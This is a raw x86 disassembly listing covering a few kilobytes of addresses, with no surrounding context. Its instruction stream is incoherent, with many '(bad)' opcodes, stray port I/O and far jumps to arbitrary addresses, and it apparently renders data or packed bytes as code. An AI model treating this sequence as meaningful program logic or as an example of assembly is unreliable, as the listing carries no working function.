  41b0e6:	mov    bh,0xe7
  41b0e8:	loopne 0x41b163
  41b0ea:	lahf   
  41b0eb:	fdivp  st(6),st
  41b0ed:	sub    esi,DWORD PTR [ebx]
  41b0ef:	jmp    0x96f0:0xa4ea8847
  41b0f6:	mov    BYTE PTR [edi-0x63c1257],dh
  41b0fc:	inc    ebx
  41b0fd:	jecxz  0x41b089
  41b0ff:	cmp    ecx,ecx
  41b101:	add    DWORD PTR [ebp+0x5e8662b5],esp
  41b107:	out    dx,eax
  41b108:	sbb    al,0x7b
  41b10a:	sti    
  41b10b:	mov    ds:0x8ee8e33d,al
  41b110:	shl    DWORD PTR [ebx-0x23],1
  41b113:	fidiv  WORD PTR [ecx-0x66756743]
  41b119:	stc    
  41b11a:	lock and BYTE PTR ds:[ebx+0x3e74ecaf],0xa9
  41b123:	dec    edx
  41b124:	fpatan 
  41b126:	mov    edx,0xc09c034
  41b12b:	shr    BYTE PTR [ebp-0x9],cl
  41b12e:	jmp    0xdbcf:0x7a8c1f74
  41b135:	push   ecx
  41b136:	jne    0x41b15c
  41b138:	xchg   esi,eax
  41b139:	nop
  41b13a:	stos   BYTE PTR es:[edi],al
  41b13b:	push   esi
  41b13c:	xchg   edx,eax
  41b13d:	mov    esp,0x774a11c8
  41b142:	mov    dl,cl
  41b144:	ret    
  41b145:	int3   
  41b146:	int3   
  41b147:	test   al,0x2a
  41b149:	std    
  41b14a:	sbb    eax,DWORD PTR [edx]
  41b14c:	retf   0x709
  41b14f:	pop    edi
  41b150:	std    
  41b151:	stos   DWORD PTR es:[edi],eax
  41b152:	(bad)
  41b155:	cs test al,0x48
  41b158:	adc    eax,0x54d4071d
  41b15d:	inc    ecx
  41b15e:	xchg   edi,eax
  41b15f:	dec    ebx
  41b160:	mov    al,ds:0x4ac49d10
  41b165:	test   DWORD PTR [ebp+0x1f5607ca],eax
  41b16b:	loopne 0x41b16e
  41b16d:	lock jne 0x41b1ed
  41b170:	adc    al,0x3b
  41b172:	pop    ebx
  41b173:	aad    0x95
  41b175:	and    al,0x45
  41b177:	push   ds
  41b178:	adc    eax,0xa5a9392b
  41b17d:	add    eax,DWORD PTR [eax]
  41b17f:	or     DWORD PTR [eax],edi
  41b181:	cmp    eax,0x7144c186
  41b186:	push   esp
  41b187:	popf   
  41b188:	cmp    ebx,DWORD PTR [edi]
  41b18a:	pop    edi
  41b18b:	xor    al,0x66
  41b18d:	mov    ch,0x7e
  41b18f:	retf   
  41b190:	ror    ebp,0x33
  41b193:	mov    ebp,0x4f7f9d58
  41b198:	int    0xa2
  41b19a:	or     ah,BYTE PTR [eax+0x3196948c]
  41b1a0:	push   ecx
  41b1a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a2:	retf   
  41b1a3:	cdq    
  41b1a4:	jne    0x41b1fa
  41b1a6:	test   BYTE PTR [ebp+0x79176468],bh
  41b1ac:	xor    al,0xb6
  41b1ae:	adc    DWORD PTR [ebx],esp
  41b1b0:	pop    edi
  41b1b1:	sub    al,ch
  41b1b3:	rol    BYTE PTR [edx+0x24],cl
  41b1b6:	cmp    eax,0xbdb7ef64
  41b1bb:	jo     0x41b1e5
  41b1bd:	addr16 aad 0x5f
  41b1c0:	lds    ebp,FWORD PTR [ecx+0x4e6f678b]
  41b1c6:	add    BYTE PTR [esi+eiz*1],dh
  41b1c9:	or     DWORD PTR [ecx-0x6f735786],0x3e12c2de
  41b1d3:	adc    bh,ch
  41b1d5:	xchg   esp,eax
  41b1d6:	clc    
  41b1d7:	or     bl,BYTE PTR [eax-0x79]
  41b1da:	push   esi
  41b1db:	push   ecx
  41b1dc:	stos   DWORD PTR es:[edi],eax
  41b1dd:	les    ebp,FWORD PTR [ecx-0x24a452a]
  41b1e3:	scas   eax,DWORD PTR es:[edi]
  41b1e4:	iret   
  41b1e5:	dec    ecx
  41b1e6:	push   0x65
  41b1e8:	imul   esi,DWORD PTR [esi*8-0x661b63e0],0xffffffd1
  41b1f0:	xchg   DWORD PTR ds:0xfd304fd3,edi
  41b1f6:	(bad)  
  41b1f8:	inc    esi
  41b1f9:	mov    bl,0x39
  41b1fb:	push   esp
  41b1fc:	in     eax,0x99
  41b1fe:	ret    
  41b1ff:	frstpm(287 only) 
  41b201:	in     eax,0xcd
  41b203:	adc    eax,DWORD PTR [edi-0x10]
  41b206:	pxor   mm1,QWORD PTR [ecx-0x7a]
  41b20a:	jge    0x41b1f2
  41b20c:	cli    
  41b20d:	xor    edi,DWORD PTR [esi-0x60]
  41b210:	jo     0x41b1e4
  41b212:	stc    
  41b213:	pusha  
  41b214:	add    ah,al
  41b216:	mov    esp,DWORD PTR ds:0x832b6845
  41b21c:	push   cs
  41b21d:	fild   WORD PTR [edx]
  41b21f:	mov    WORD PTR [esp+ebp*2-0xf],gs
  41b223:	(bad)  
  41b224:	or     al,0xb8
  41b226:	in     al,0x54
  41b228:	pop    es
  41b229:	jb     0x41b275
  41b22b:	dec    esp
  41b22c:	jmp    0x4b510b52
  41b231:	mov    ebx,0x6a53a230
  41b236:	jp     0x41b288
  41b238:	adc    al,0xf3
  41b23a:	xor    DWORD PTR [edi+0x23],eax
  41b23d:	ss mov dl,0x73
  41b240:	push   ebp
  41b241:	dec    edx
  41b242:	jecxz  0x41b1e1
  41b244:	sub    eax,0xec6a5759
  41b249:	pop    eax
  41b24a:	loopne 0x41b1e4
  41b24c:	mov    BYTE PTR [ecx+0x56348b12],bh
  41b252:	mov    cl,0xec
  41b254:	xchg   ebx,eax
  41b255:	call   0x3e91:0x6ea694f2
  41b25c:	lea    ebp,[edx-0x13e80134]
  41b262:	push   ebx
  41b263:	(bad)  
  41b264:	leave  
  41b265:	lds    edx,FWORD PTR [edx-0x3ea4edee]
  41b26b:	scas   eax,DWORD PTR es:[edi]
  41b26c:	xor    eax,0xe9a7f772
  41b271:	push   cs
  41b272:	sub    ecx,0xffffffcf
  41b275:	jnp    0x41b21a
  41b277:	imul   BYTE PTR [ecx-0x33]
  41b27a:	pop    esi
  41b27b:	fistp  WORD PTR [eax-0xb]
  41b27e:	scas   eax,DWORD PTR es:[edi]
  41b27f:	pop    ebx
  41b280:	push   ebx
  41b281:	popf   
  41b282:	mov    ebx,0x8b574d74
  41b287:	push   ebp
  41b288:	dec    edi
  41b289:	mov    bh,0xa9
  41b28b:	jns    0x41b2d6
  41b28d:	dec    eax
  41b28e:	lds    ebx,FWORD PTR [ebx+0x6e]
  41b291:	xchg   ebx,eax
  41b292:	imul   eax,DWORD PTR [ebp-0x192da8bd],0x997e3680
  41b29c:	dec    edi
  41b29d:	push   ss
  41b29e:	mov    al,0xdd
  41b2a0:	jg     0xb7270161
  41b2a6:	fs js  0x41b2ff
  41b2a9:	pop    ebx
  41b2aa:	push   esi
  41b2ab:	push   ss
  41b2ac:	rcl    BYTE PTR [eax+0x664529ad],cl
  41b2b2:	xchg   ecx,ecx
  41b2b4:	and    ebx,DWORD PTR [ecx+0x41]
  41b2b7:	inc    BYTE PTR ds:0xe9243aee
  41b2bd:	(bad)  
  41b2be:	push   ebx
  41b2bf:	(bad)  
  41b2c0:	frstpm(287 only) 
  41b2c2:	pop    ecx
  41b2c3:	in     eax,dx
  41b2c4:	pop    esp
  41b2c5:	mov    es,WORD PTR [edx+0x1850d332]
  41b2cb:	dec    eax
  41b2cc:	adc    al,dh
  41b2ce:	iret   
  41b2cf:	dec    ebx
  41b2d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2d1:	int    0x84
  41b2d3:	and    ch,bl
  41b2d5:	cs pop esi
  41b2d7:	js     0x41b2b3
  41b2d9:	sbb    edi,DWORD PTR [ebx]
  41b2db:	(bad)  
  41b2dc:	sahf   
  41b2dd:	push   ebx
  41b2de:	fisttp WORD PTR [si]
  41b2e1:	mov    BYTE PTR [esi-0x62],al
  41b2e4:	sbb    al,0xc7
  41b2e6:	xor    al,0x2
  41b2e8:	or     dl,bh
  41b2ea:	in     eax,0xcd
  41b2ec:	sbb    bh,0xbb
  41b2ef:	mov    ecx,0x811af73
  41b2f4:	mov    esi,0xe0c907ab
  41b2f9:	sbb    al,0xfc
  41b2fb:	hlt    
  41b2fc:	mov    esp,0x835225b1
  41b301:	mov    ebx,ds
  41b303:	sbb    eax,0xc397c356
  41b308:	outs   dx,BYTE PTR ds:[esi]
  41b309:	repnz xor DWORD PTR [eax],edi
  41b30c:	cli    
  41b30d:	push   ebx
  41b30e:	addr16 push edi
  41b310:	fbstp  TBYTE PTR [eax-0x19]
  41b313:	mov    ch,0x5d
  41b315:	mov    esi,0x5ee18f7c
  41b31a:	ins    DWORD PTR es:[edi],dx
  41b31b:	and    eax,0x3bdd3945
  41b320:	push   eax
  41b321:	nop
  41b322:	jl     0x41b366
  41b324:	int    0x30
  41b326:	cmp    dl,dh
  41b328:	in     al,0xfe
  41b32a:	pop    ebp
  41b32b:	adc    DWORD PTR [edi-0x23e73a59],edi
  41b331:	sub    DWORD PTR [edx-0x13],0x6732d51c
  41b338:	mov    bl,ch
  41b33a:	cmp    BYTE PTR [ebp-0x3ebef7bc],bh
  41b340:	cmp    ebx,DWORD PTR [eax+0x5728e0a6]
  41b346:	inc    edx
  41b347:	jns    0x41b32c
  41b349:	sub    al,0xea
  41b34b:	pop    ebp
  41b34c:	inc    esp
  41b34d:	dec    ecx
  41b34e:	ret    0xe7ec
  41b351:	inc    edx
  41b352:	ja     0x41b2f8
  41b354:	(bad)  
  41b355:	dec    edx
  41b356:	bound  esp,QWORD PTR [esi-0x440b4cb9]
  41b35c:	push   cs
  41b35d:	sbb    DWORD PTR [edi-0x49],edi
  41b360:	pushf  
  41b361:	or     al,0x50
  41b363:	mov    BYTE PTR [ecx],bh
  41b365:	pop    ebx
  41b366:	scas   al,BYTE PTR es:[edi]
  41b367:	jmp    0x90a1b4e7
  41b36c:	out    dx,eax
  41b36d:	or     dh,BYTE PTR [edi+ebx*8+0x3]
  41b371:	mov    eax,0xdb32a029
  41b376:	adc    ecx,DWORD PTR [eax-0x4b]
  41b379:	push   ss
  41b37a:	cmp    al,0x9a
  41b37c:	out    dx,al
  41b37d:	lods   eax,DWORD PTR ds:[esi]
  41b37e:	dec    esi
  41b37f:	mov    bh,0x83
  41b381:	dec    ebp
  41b382:	push   0x93b92a65
  41b387:	pop    ebp
  41b388:	imul   esp,DWORD PTR [eax+0x57],0xffffff91
  41b38c:	in     eax,dx
  41b38d:	repz aaa 
  41b38f:	xchg   ebx,eax
  41b390:	ret    
  41b391:	loopne 0x41b3ef
  41b393:	out    0x28,eax
  41b395:	xor    al,BYTE PTR [ebp-0x38be09dc]
  41b39b:	aaa    
  41b39c:	(bad)  
  41b39d:	lods   al,BYTE PTR ds:[esi]
  41b39e:	pop    es
  41b39f:	jo     0x41b35d
  41b3a1:	shr    DWORD PTR [eax+0x1f],0x83
  41b3a5:	jno    0x41b345
  41b3a7:	dec    ebp
  41b3a8:	imul   eax,DWORD PTR [edi+0x21713da3],0xffffffe6
  41b3af:	jp     0x41b41b
  41b3b1:	push   0x32
  41b3b3:	mov    ch,0xfb
  41b3b5:	jle    0x41b3af
  41b3b7:	jge    0x41b3c7
  41b3b9:	sbb    al,0x2b
  41b3bb:	(bad)  
  41b3bd:	lahf   
  41b3be:	dec    edi
  41b3bf:	push   ebp
  41b3c0:	jmp    0x96b0:0x411b6705
  41b3c7:	or     DWORD PTR [edi-0x445e4d44],ebp
  41b3cd:	add    esi,DWORD PTR [esi+0xcbe0a38]
  41b3d3:	sbb    eax,0xc9e966f7
  41b3d8:	add    eax,0xb535c9fe
  41b3dd:	xor    al,0x9d
  41b3df:	outs   dx,DWORD PTR ds:[esi]
  41b3e0:	adc    al,0x74
  41b3e2:	in     al,0xbf
  41b3e4:	or     esi,DWORD PTR [ebx]
  41b3e6:	out    dx,eax
  41b3e7:	in     al,0x2c
  41b3e9:	xchg   ebp,eax
  41b3ea:	add    BYTE PTR [esi+0x69f86444],0x6a
  41b3f1:	mov    esi,0xaf59225a
  41b3f6:	or     esi,DWORD PTR ds:0x959734e1
  41b3fc:	fadd   QWORD PTR [ebp+edi*1+0x4035a207]
  41b403:	cdq    
  41b404:	and    BYTE PTR [edx-0x60],0xbb
  41b408:	mov    ebp,0x13e0fd11
  41b40d:	and    eax,0x7fb0b6df
  41b412:	xor    DWORD PTR [edi+0x652eb83b],esp
  41b418:	ins    BYTE PTR es:[edi],dx
  41b419:	stc    
  41b41a:	push   esi
  41b41b:	stos   BYTE PTR es:[edi],al
  41b41c:	xor    dl,ah
  41b41e:	mov    ds:0x3e90f27a,eax
  41b423:	mov    eax,0x8ed4eb88
  41b428:	mov    esi,0x11fe2ca8
  41b42d:	dec    edx
  41b42e:	lods   eax,DWORD PTR ds:[esi]
  41b42f:	ret    
  41b430:	mov    ebx,0x5330477f
  41b435:	bound  esi,QWORD PTR ds:0x90c8c389
  41b43b:	xchg   edi,eax
  41b43c:	mov    al,0x88
  41b43e:	add    BYTE PTR [esi],bh
  41b440:	cmc    
  41b441:	lods   eax,DWORD PTR ds:[esi]
  41b442:	clc    
  41b443:	or     ah,BYTE PTR [edi+0x31]
  41b446:	stos   BYTE PTR es:[edi],al
  41b447:	stc    
  41b448:	shl    BYTE PTR [ebx],0x7
  41b44b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b44c:	sub    eax,0xcaffe5c
  41b451:	mov    eax,ds:0x287567dd
  41b456:	xchg   esp,eax
  41b457:	pop    ebp
  41b458:	dec    esp
  41b459:	bound  esp,QWORD PTR [ecx+edi*8]
  41b45c:	inc    ecx
  41b45d:	dec    bl
  41b45f:	in     eax,dx
  41b460:	js     0x41b462
  41b462:	xchg   esp,eax
  41b463:	mov    eax,DWORD PTR [eax]
  41b465:	(bad)  
  41b466:	popf   
  41b467:	sbb    edi,esi
  41b469:	jmp    0xd127:0x10537855
  41b470:	xchg   BYTE PTR [esi],ch
  41b472:	and    BYTE PTR [ebp+ebp*1+0x14],ah
  41b476:	aam    0x23
  41b478:	adc    eax,0xfb37c883
  41b47d:	(bad)  
  41b47e:	dec    ebx
  41b47f:	push   ebp
  41b480:	out    0x4c,eax
  41b482:	mov    al,ds:0x5803180e
  41b487:	xchg   ebp,eax
  41b488:	jb     0x41b4e8
  41b48a:	jb     0x41b4a3
  41b48c:	and    esi,ecx
  41b48e:	xor    BYTE PTR ds:0x41562bda,dl
  41b494:	rcr    cl,1
  41b496:	fs fadd st,st(6)
  41b499:	mov    cl,0xe8
  41b49b:	jl     0x41b449
  41b49d:	add    DWORD PTR [eax-0x160d6aaf],eax
  41b4a3:	test   eax,0x68c1e498
  41b4a8:	ins    BYTE PTR es:[edi],dx
  41b4a9:	daa    
  41b4aa:	out    0xd0,eax
  41b4ac:	pop    ds
  41b4ad:	outs   dx,DWORD PTR ds:[esi]
  41b4ae:	test   al,0x1b
  41b4b0:	(bad)  
  41b4b1:	xchg   edi,eax
  41b4b2:	pop    edi
  41b4b3:	(bad)  
  41b4b4:	out    0xd5,al
  41b4b6:	enter  0x154b,0xfd
  41b4ba:	call   0x3d022802
  41b4bf:	int    0xf2
  41b4c1:	push   ecx
  41b4c2:	outs   dx,DWORD PTR ds:[esi]
  41b4c3:	mov    edi,0xe8e6842e
  41b4c8:	jmp    0xc592:0xe57e8ea1
  41b4cf:	mov    al,ds:0x0
	...
  41b69c:	xor    eax,esp
  41b69e:	loope  0x41b659
  41b6a0:	icebp  
  41b6a1:	mov    ecx,0xab3fe879
  41b6a6:	in     al,0x3
  41b6a8:	jnp    0x41b69b
  41b6aa:	and    al,0xb1
  41b6ac:	mov    ebp,eax
  41b6ae:	add    DWORD PTR [eax],eax
  41b6b0:	push   ds
  41b6b1:	pop    es
  41b6b2:	add    BYTE PTR [eax],al
  41b6b4:	or     dl,BYTE PTR [ecx]
  41b6b6:	(bad)  
  41b6b7:	(bad)  
  41b6b8:	fmul   st(3),st
  41b6ba:	out    dx,al
  41b6bb:	sti    
  41b6bc:	sbb    eax,0x81759956
  41b6c1:	cdq    
  41b6c2:	or     al,0x68
  41b6c4:	mov    dl,BYTE PTR [eax]
  41b6c6:	bound  eax,QWORD PTR [ebp-0x45]
  41b6c9:	leave  
  41b6ca:	into   
  41b6cb:	in     eax,dx
  41b6cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6cd:	inc    edi
  41b6ce:	and    eax,0x4e285c47
  41b6d3:	fisttp DWORD PTR [ebx+ebx*1]
  41b6d6:	mov    ecx,0x73f211de
  41b6db:	pop    eax
  41b6dc:	mov    DWORD PTR [esi-0x52],esp
  41b6df:	adc    BYTE PTR [edi],ch
  41b6e1:	call   0x17385c4
  41b6e6:	jb     0x41b710
  41b6e8:	adc    dl,BYTE PTR [esi]
  41b6ea:	cmp    dl,BYTE PTR [esi*1-0x8456bef]
  41b6f1:	dec    edi
  41b6f2:	push   0x79
  41b6f4:	dec    esp
  41b6f5:	jo     0x41b746
  41b6f7:	add    esp,DWORD PTR [edi-0x447d28e0]
  41b6fd:	cmp    BYTE PTR [ebx],al
  41b6ff:	call   0xfbd4:0x3012dd6b
  41b706:	mov    dl,0xf1
  41b708:	sub    ecx,DWORD PTR [ecx+eiz*4]
  41b70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b70c:	test   bl,al
  41b70e:	lock mov dh,0x24
  41b711:	(bad)  
  41b712:	jae    0x41b69b
  41b714:	mov    bh,0xca
  41b716:	iret   
  41b717:	out    0x7e,eax
  41b719:	inc    esp
  41b71a:	loope  0x41b6bf
  41b71c:	xor    DWORD PTR cs:[edx],edi
  41b71f:	xor    dl,dh
  41b721:	int    0x88
  41b723:	out    0xf2,eax
  41b725:	sbb    cl,bh
  41b727:	dec    ebx
  41b728:	fcomi  st,st(3)
  41b72a:	jae    0x41b748
  41b72c:	ds or  eax,0xe43c2b96
  41b732:	or     DWORD PTR [edx],ecx
  41b734:	aam    0x1b
  41b736:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b737:	adc    eax,0x64925a1a
  41b73c:	or     BYTE PTR [edi],ah
  41b73e:	xlat   BYTE PTR ds:[ebx]
  41b73f:	int3   
  41b740:	cdq    
  41b741:	cld    
  41b742:	ja     0x41b76c
  41b744:	popa   
  41b745:	loop   0x41b7a3
  41b747:	punpckhbw mm0,mm3
  41b74a:	adc    BYTE PTR [esi],bl
  41b74c:	mov    edi,esi
  41b74e:	bnd jnp 0x41b71c
  41b751:	jmp    0xc9f:0x93ae98e3
  41b758:	stos   DWORD PTR es:[edi],eax
  41b759:	rcr    DWORD PTR [eax-0x2c],1
  41b75c:	push   0x40bcc532
  41b761:	das    
  41b762:	xchg   DWORD PTR [eax+edi*2+0x27],edx
  41b766:	pop    esp
  41b767:	test   al,0x22
  41b769:	sbb    esp,edi
  41b76b:	pop    es
  41b76c:	jne    0x41b717
  41b76e:	aas    
  41b76f:	push   edi
  41b770:	mov    cl,0x9
  41b772:	xchg   DWORD PTR [edx+0x4a],edi
  41b775:	dec    ebp
  41b776:	idiv   DWORD PTR [ebp-0x2bb3a9ba]
  41b77c:	shl    esp,cl
  41b77e:	adc    dl,BYTE PTR [ecx-0x404ed6db]
  41b784:	(bad)  
  41b785:	fmul   st,st(4)
  41b787:	add    bl,cl
  41b789:	scas   eax,DWORD PTR es:[edi]
  41b78a:	and    esi,DWORD PTR [edx+0x1d]
  41b78d:	push   ss
  41b78e:	fwait
  41b78f:	ror    DWORD PTR [ebp-0x595e4980],cl
  41b795:	sbb    esp,DWORD PTR [ebp+0x16a980a8]
  41b79b:	shr    BYTE PTR [esi-0x56],cl
  41b79e:	mov    ebp,DWORD PTR [ebp-0x38]
  41b7a1:	je     0x41b769
  41b7a3:	cwde   
  41b7a4:	sub    BYTE PTR [eax-0x7d8b7c13],al
  41b7aa:	dec    eax
  41b7ab:	(bad)  
  41b7ac:	sbb    BYTE PTR cs:[ecx+eax*4-0xf56db0b],ah
  41b7b4:	cwde   
  41b7b5:	mov    ebp,0x70c5d9a5
  41b7ba:	call   0x2929:0x3701b9c3
  41b7c1:	(bad)  
  41b7c2:	pop    edx
  41b7c3:	jg     0x41b780
  41b7c5:	sub    BYTE PTR [ebx-0x75],0xd0
  41b7c9:	and    dh,dh
  41b7cb:	mov    dh,0x2
  41b7cd:	pop    esp
  41b7ce:	adc    edx,DWORD PTR [edx-0x4b099f19]
  41b7d4:	mov    bl,0x7b
  41b7d6:	mov    al,ds:0x8c7fe933
  41b7db:	mov    ecx,0x638bc73c
  41b7e0:	mov    ch,BYTE PTR [ecx+0x2b]
  41b7e3:	pusha  
  41b7e4:	bound  eax,QWORD PTR [ebx+esi*4-0x46]
  41b7e8:	xor    edx,DWORD PTR [ecx-0xc]
  41b7eb:	cmp    ebp,edi
  41b7ed:	inc    ebx
  41b7ee:	sti    
  41b7ef:	test   al,0xfb
  41b7f1:	iret   
  41b7f2:	(bad)  
  41b7f3:	mov    esi,edi
  41b7f5:	pop    ebp
  41b7f6:	out    0x3e,al
  41b7f8:	daa    
  41b7f9:	loope  0x41b81b
  41b7fb:	test   eax,0x94f90239
  41b800:	out    0xca,eax
  41b802:	jl     0x41b801
  41b804:	int    0x39
  41b806:	jns    0x41b7f7
  41b808:	(bad)  
  41b809:	mov    ah,0x60
  41b80b:	in     eax,dx
  41b80c:	or     eax,0x3a0d6370
  41b811:	inc    esi
  41b812:	fwait
  41b813:	pop    es
  41b814:	push   eax
  41b815:	mov    ?,ecx
  41b817:	jge    0x41b898
  41b819:	xor    eax,0xce40df16
  41b81e:	out    dx,al
  41b81f:	mov    esp,0xbed1a5d0
  41b824:	aaa    
  41b825:	or     ebp,ebp
  41b827:	cmp    dh,BYTE PTR [edi-0x75]
  41b82a:	ds rol ecx,1
  41b82d:	jle    0x41b7f6
  41b82f:	add    ch,BYTE PTR [edi]
  41b831:	pusha  
  41b832:	fs out dx,eax
  41b834:	into   
  41b835:	pop    esi
  41b836:	mov    esp,0xe6b84eae
  41b83b:	push   ss
  41b83c:	lahf   
  41b83d:	push   eax
  41b83e:	icebp  
  41b83f:	fwait
  41b840:	out    0x1a,al
  41b842:	adc    cl,BYTE PTR [ebx-0x26]
  41b845:	out    dx,eax
  41b846:	retf   
  41b847:	mov    bl,BYTE PTR [ebx-0x36]
  41b84a:	and    DWORD PTR [eax],ecx
  41b84c:	xchg   edx,eax
  41b84d:	jmp    0x35d80789
  41b852:	push   ds
  41b853:	mov    esi,0x5ad817a7
  41b858:	daa    
  41b859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b85a:	ror    BYTE PTR [ebp+0x6],cl
  41b85d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b85e:	les    eax,FWORD PTR [ebp-0x2b8b5871]
  41b864:	cli    
  41b865:	stc    
  41b866:	mov    eax,0x3ccdb7f1
  41b86b:	xlat   BYTE PTR ds:[ebx]
  41b86c:	lods   eax,DWORD PTR ds:[esi]
  41b86d:	ss in  al,0x7
  41b870:	push   ds
  41b871:	xor    BYTE PTR [eax-0x50],ah
  41b874:	(bad)  
  41b875:	neg    esi
  41b877:	dec    ecx
  41b878:	rcl    al,cl
  41b87a:	xchg   esi,eax
  41b87b:	call   FWORD PTR [esi+0x5e]
  41b87e:	or     bl,BYTE PTR [edx-0x4a298349]
  41b884:	in     al,dx
  41b885:	jecxz  0x41b85a
  41b887:	xchg   BYTE PTR [ecx-0x58],cl
  41b88a:	imul   esi,ecx,0x30e0430f
  41b890:	loop   0x41b83e
  41b892:	cmp    ch,BYTE PTR [esi+edx*4]
  41b895:	mov    bh,0xfc
  41b897:	push   ds
  41b898:	sub    ch,BYTE PTR [eax]
  41b89a:	ins    DWORD PTR es:[edi],dx
  41b89b:	outs   dx,BYTE PTR ds:[esi]
  41b89c:	mov    WORD PTR [ebp+0x1d],ds
  41b89f:	popf   
  41b8a0:	ficom  WORD PTR [ebx-0x5350643b]
  41b8a6:	add    edi,DWORD PTR [edi+0x60]
  41b8a9:	mov    esi,0xe0cad7fe
  41b8ae:	xchg   esi,eax
  41b8af:	inc    ebx
  41b8b0:	ds popa 
  41b8b2:	add    ecx,ecx
  41b8b4:	add    DWORD PTR [eax],esi
  41b8b6:	sahf   
  41b8b7:	mov    edx,0x328fa20e
  41b8bc:	in     eax,0xbf
  41b8be:	pop    es
  41b8bf:	lea    ebx,[edi+ebx*8+0x28]
  41b8c3:	sub    al,0x3
  41b8c5:	fsub   DWORD PTR ss:[edi+0x8]
  41b8c9:	jg     0x41b93d
  41b8cb:	fmul   DWORD PTR [ebp-0x1afc1fc]
  41b8d1:	push   ss
  41b8d2:	call   0xdd72:0x14edcb76
  41b8d9:	fcmovnb st,st(3)
  41b8db:	addr16 push ss
  41b8dd:	and    al,0x1d
  41b8df:	out    dx,eax
  41b8e0:	push   ds
  41b8e1:	mov    ebx,0x447d160b
  41b8e6:	add    al,0xde
  41b8e8:	in     al,dx
  41b8e9:	pop    edi
  41b8ea:	arpl   WORD PTR [ebx+ebx*2],di
  41b8ed:	xor    al,0xe5
  41b8ef:	mov    BYTE PTR [esi-0x6076fa56],al
  41b8f5:	inc    esi
  41b8f6:	cwde   
  41b8f7:	push   edx
  41b8f8:	cmp    eax,0x9c773198
  41b8fd:	or     al,0x87
  41b8ff:	shr    ecx,cl
  41b901:	mov    DWORD PTR [ecx+0x69702143],ebp
  41b907:	into   
  41b908:	jne    0x41b8d0
  41b90a:	(bad)  
  41b90b:	mov    edx,DWORD PTR ss:[eax]
  41b90e:	and    ch,ah
  41b910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b911:	push   edx
  41b912:	adc    BYTE PTR [esi+0x2b],0x6b
  41b916:	cmp    edi,DWORD PTR [edx-0x14]
  41b919:	cmp    BYTE PTR [edi-0x276263fc],0xa5
  41b920:	leave  
  41b921:	out    0x65,eax
  41b923:	inc    ebp
  41b924:	mov    dh,0x12
  41b926:	pop    ebx
  41b927:	test   eax,0xba817f80
  41b92c:	je     0x41b8c5
  41b92e:	mov    edi,0x9350da5b
  41b933:	addr16 loop 0x41b933
  41b936:	mov    dl,0xc7
  41b938:	sub    DWORD PTR [edi+0x5a],ebx
  41b93b:	mov    esp,0xd2f87ff7
  41b940:	js     0x41b8f9
  41b942:	sbb    ebx,ebp
  41b944:	loop   0x41b98f
  41b946:	push   edx
  41b947:	mov    WORD PTR [esi],fs
  41b949:	ins    DWORD PTR es:[edi],dx
  41b94a:	dec    edi
  41b94b:	xchg   edi,eax
  41b94c:	xor    DWORD PTR [edx],esi
  41b94e:	and    bh,BYTE PTR [ebx+ebx*4]
  41b951:	mov    esp,ecx
  41b953:	cmp    eax,0x145d7bc7
  41b958:	hlt    
  41b959:	xlat   BYTE PTR ds:[ebx]
  41b95a:	imul   eax,esi,0x59
  41b95d:	stos   DWORD PTR es:[edi],eax
  41b95e:	imul   ebx,ebx,0xf4e67c04
  41b964:	mov    edx,0xb5c46c1a
  41b969:	xchg   ebp,eax
  41b96a:	mov    bl,0x6e
  41b96c:	retf   
  41b96d:	imul   eax,DWORD PTR [edx+0xc65494b],0xfffffff8
  41b974:	adc    dl,dh
  41b976:	and    ebp,edi
  41b978:	(bad)  
  41b979:	stos   DWORD PTR es:[edi],eax
  41b97a:	push   ds
  41b97b:	sbb    al,0x5
  41b97d:	pop    ss
  41b97e:	repz push ss
  41b980:	mov    DWORD PTR [eax+0x1f],ecx
  41b983:	sbb    cl,BYTE PTR [ebx+0xd345a6f]
  41b989:	add    eax,DWORD PTR [esp+ebx*2+0x7d]
  41b98d:	mov    edi,0xece1cfb9
  41b992:	xchg   edi,eax
  41b993:	dec    ecx
  41b994:	cmp    BYTE PTR [esi+0x2a44d3c2],0xb7
  41b99b:	out    0xa5,eax
  41b99d:	(bad)  
  41b99e:	jbe    0x41b951
  41b9a0:	pushf  
  41b9a1:	push   ebx
  41b9a2:	fsubr  DWORD PTR [ebx-0x6a]
  41b9a5:	mov    dh,0x55
  41b9a7:	and    ecx,DWORD PTR [ecx+0x3d]
  41b9aa:	data16 jo 0x41ba11
  41b9ad:	les    edx,FWORD PTR ds:0x30de4da0
  41b9b3:	push   edx
  41b9b4:	fidiv  DWORD PTR [edi-0x75]
  41b9b7:	sbb    ebp,ebp
  41b9b9:	jo     0x41ba06
  41b9bb:	jae    0x41b980
  41b9bd:	repnz sti 
  41b9bf:	mov    ah,0x45
  41b9c1:	push   ss
  41b9c2:	add    esi,DWORD PTR [ecx]
  41b9c4:	int3   
  41b9c5:	clc    
  41b9c6:	in     eax,dx
  41b9c7:	daa    
  41b9c8:	inc    esi
  41b9c9:	cmp    ebp,DWORD PTR [esi+0x2860b83d]
  41b9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9d0:	scas   eax,DWORD PTR es:[edi]
  41b9d1:	ja     0x41ba4c
  41b9d3:	xor    dl,BYTE PTR [ebp-0x1aee68e6]
  41b9d9:	sbb    eax,0x787d308a
  41b9de:	(bad)  
  41b9df:	out    0x1f,al
  41b9e1:	out    0xba,eax
  41b9e3:	mov    edi,0x72af2a9d
  41b9e8:	(bad)  
  41b9e9:	push   edx
  41b9ea:	call   0xe1e4:0xeee67a07
  41b9f1:	neg    DWORD PTR [esi-0x25]
  41b9f4:	mov    ah,0xf6
  41b9f6:	or     dl,bh
  41b9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9f9:	xor    al,0x34
  41b9fb:	jb     0x41b97d
  41b9fd:	les    edi,FWORD PTR [edi]
  41b9ff:	xchg   esp,eax
  41ba00:	idiv   BYTE PTR [eax]
  41ba02:	inc    esp
  41ba03:	add    al,al
  41ba05:	fst    DWORD PTR [ecx+0x3853602a]
  41ba0b:	sbb    edx,esi
